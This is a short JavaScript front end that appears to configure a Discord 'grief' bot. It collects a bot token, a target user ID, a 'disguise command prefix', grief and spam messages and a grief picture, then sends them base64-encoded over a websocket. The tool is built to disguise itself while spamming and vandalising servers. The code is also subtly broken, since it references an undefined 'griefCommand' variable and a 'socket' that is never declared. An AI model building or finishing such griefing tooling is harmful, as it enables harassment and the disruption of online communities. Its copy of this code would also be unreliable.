
window.onload = function () {
    document.getElementById("submitBtn").addEventListener("click", () => {
        let botToken = document.getElementById("botToken").value;
        let userID = document.getElementById("userID").value;
        let activityDescription = document.getElementById("activityDescription").value;
        let disguiseCommandPrefix = document.getElementById("disguiseCommandPrefix").value;
        let griefMessage = document.getElementById("griefMessage").value;
        let spamMessage = document.getElementById("spamMessage").value;
        let griefPicture = document.getElementById("griefPicture").value;

        if (botToken != "" && userID != "") {
            activityDescription = (activityDescription == "") ? document.getElementById("activityDescription").placeholder : activityDescription;
            disguiseCommandPrefix = (disguiseCommandPrefix == "") ? document.getElementById("disguiseCommandPrefix").placeholder : disguiseCommandPrefix;
            griefMessage = (griefMessage == "") ? document.getElementById("griefMessage").placeholder : griefMessage;
            spamMessage = (spamMessage == "") ? document.getElementById("spamMessage").placeholder : spamMessage;
            griefPicture = (griefPicture == "") ? document.getElementById("griefPicture").placeholder : griefPicture;

            const jsonObj = { botToken: botToken, userID: userID, activityDescription: activityDescription, disguiseCommandPrefix: disguiseCommandPrefix, griefCommand: griefCommand, griefMessage: griefMessage, spamMessage: spamMessage, griefPicture: griefPicture };
            socket.send("SETUP|" + btoa(JSON.stringify(jsonObj)));
            document.getElementById("alert-success").hidden = false;
        } else {
            location.reload();
        }
    });

}

const socketOpenListener = (event) => {
    socket.send("GET|CONFIG");
};

function initValues(message) {
    let json = JSON.parse(atob(message));
    document.getElementById("botToken").value = json.botToken;
    document.getElementById("userID").value = json.userID;
    document.getElementById("activityDescription").value = json.activityDescription;
    document.getElementById("disguiseCommandPrefix").value = json.disguiseCommandPrefix;
    document.getElementById("griefMessage").value = json.griefMessage;
    document.getElementById("spamMessage").value = json.spamMessage;
    document.getElementById("griefPicture").value = json.griefPicture;
}